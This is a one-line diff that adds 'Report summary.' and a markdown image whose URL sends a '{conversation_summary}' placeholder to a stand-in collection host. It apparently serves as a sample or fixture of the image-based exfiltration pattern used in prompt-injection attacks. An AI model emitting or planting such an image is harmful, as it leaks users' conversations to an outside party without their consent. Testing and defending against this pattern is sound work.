@@ -1,0 +1,1 @@
+Report summary. ![status](https://collect.example.test/p.png?d={conversation_summary})
